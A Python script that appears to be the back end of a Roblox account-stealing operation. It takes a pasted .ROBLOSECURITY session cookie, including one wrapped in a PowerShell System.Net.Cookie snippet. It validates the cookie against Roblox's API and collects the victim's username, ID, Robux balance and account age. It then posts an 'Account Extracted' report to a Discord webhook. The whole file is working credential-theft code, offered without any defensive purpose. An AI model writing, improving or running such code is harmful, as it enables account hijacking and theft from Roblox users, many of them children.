import sys
import os
import re
import requests
from datetime import datetime, timezone

def validate_and_clean_cookie(raw_input):
    if not raw_input:
        raise ValueError("Invalid cookie format provided.")

    raw_str = str(raw_input).strip()

    ps_match = re.search(r'System\.Net\.Cookie\(\s*["\']\.ROBLOSECURITY["\']\s*,\s*["\']([^"\']+)["\']', raw_str)
    if ps_match:
        cookie = ps_match.group(1)
    else:
        cookie = raw_str

    if (cookie.startswith('"') and cookie.endswith('"')) or (cookie.startswith("'") and cookie.endswith("'")):
        cookie = cookie[1:-1].strip()

    if cookie.startswith(".ROBLOSECURITY="):
        cookie = cookie[len(".ROBLOSECURITY="):].strip()

    warning_match = re.search(r'(_\\?\|WARNING:[^"\']+)', cookie)
    if warning_match:
        cookie = warning_match.group(1)

    cookie = cookie.rstrip(';').strip()

    expected_prefix = "_|WARNING:-DO-NOT-SHARE-THIS"
    if not cookie.startswith(expected_prefix):
        raise ValueError("Invalid cookie format: Missing Roblox security warning header.")

    if not all(32 <= ord(c) < 127 for c in cookie):
        raise ValueError("Invalid cookie format: Contains non-ASCII characters.")

    return cookie

class PersistentRobloxSession:
    def __init__(self, initial_cookie):
        self.session = requests.Session()
        self.session.cookies.set(".ROBLOSECURITY", initial_cookie, domain=".roblox.com")
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Referer": "https://www.roblox.com/",
            "Origin": "https://www.roblox.com/"
        })
        self.csrf_token = None

    def request(self, method, url, **kwargs):
        if method.upper() in ["POST", "PATCH", "DELETE"] and self.csrf_token:
            kwargs.setdefault("headers", {})["X-CSRF-Token"] = self.csrf_token

        response = self.session.request(method, url, timeout=10, **kwargs)

        new_cookie = self.session.cookies.get(".ROBLOSECURITY", domain=".roblox.com")
        if new_cookie:
            self.session.cookies.set(".ROBLOSECURITY", new_cookie, domain=".roblox.com")

        if response.status_code == 403 and "x-csrf-token" in response.headers:
            new_token = response.headers["x-csrf-token"]
            self.csrf_token = new_token
            kwargs.setdefault("headers", {})["X-CSRF-Token"] = new_token
            response = self.session.request(method, url, timeout=10, **kwargs)

        return response

def main():
    try:
        print("DEBUG: Python Extractor started", file=sys.stderr)
        
        webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
        if not webhook_url:
            print("DEBUG ERROR: DISCORD_WEBHOOK_URL environment variable is missing!", file=sys.stderr)
            sys.exit(1)

        if len(sys.argv) < 2:
            print("DEBUG: No argument provided", file=sys.stderr)
            sys.exit(1)
        
        try:
            roblosecurity = validate_and_clean_cookie(sys.argv[1])
        except ValueError as ve:
            print(f"ERROR: {str(ve)}", file=sys.stderr)
            sys.exit(1)

        client = PersistentRobloxSession(roblosecurity)

        auth_res = client.request("GET", "https://users.roblox.com/v1/users/authenticated")
        print(f"DEBUG: Auth status code: {auth_res.status_code}", file=sys.stderr)
        
        if auth_res.status_code == 401:
            print("Cookie invalid, expired, or IP-locked. Stopping cleanly.", file=sys.stderr)
            sys.exit(1)
        elif auth_res.status_code != 200:
            print(f"DEBUG RESPONSE: {auth_res.text}", file=sys.stderr)
            sys.exit(1)
            
        auth_data = auth_res.json()
        user_id = auth_data.get("id")
        if not user_id:
            sys.exit(1)

        username = auth_data.get("name", "Unknown")
        display_name = auth_data.get("displayName", username)

        user = client.request("GET", f"https://users.roblox.com/v1/users/{user_id}").json()
        created = user.get("created", "")
        age_days = (datetime.now(timezone.utc) - datetime.fromisoformat(created.replace("Z", "+00:00"))).days if created else 0
        
        robux_res = client.request("GET", f"https://economy.roblox.com/v1/users/{user_id}/currency").json()
        robux = robux_res.get("robux", 0)

        # Ultra-simple, bulletproof flat payload (no complex embeds array to trigger 400 errors)
        payload = {
            "content": f"👑 **Account Extracted Successfully!**\n"
                       f"• **Username:** `{username}` ({display_name})\n"
                       f"• **User ID:** `{user_id}`\n"
                       f"• **Robux Balance:** `{robux:,} R$`\n"
                       f"• **Account Age:** `{age_days} Days`\n"
                       f"• **Profile:** https://www.roblox.com/users/{user_id}/profile"
        }

        r = requests.post(webhook_url, json=payload, timeout=10)
        print(f"DEBUG: Webhook response status: {r.status_code}", file=sys.stderr)
        print(f"DEBUG: Webhook response body: {r.text}", file=sys.stderr)
        
        if r.status_code not in (200, 204):
            print(f"ERROR: Webhook dispatch failed: {r.text}", file=sys.stderr)
            sys.exit(1)
        else:
            print("DEBUG: Webhook delivered successfully!", file=sys.stderr)

    except Exception as e:
        print(f"DEBUG CRITICAL EXCEPTION: {e}", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    main()
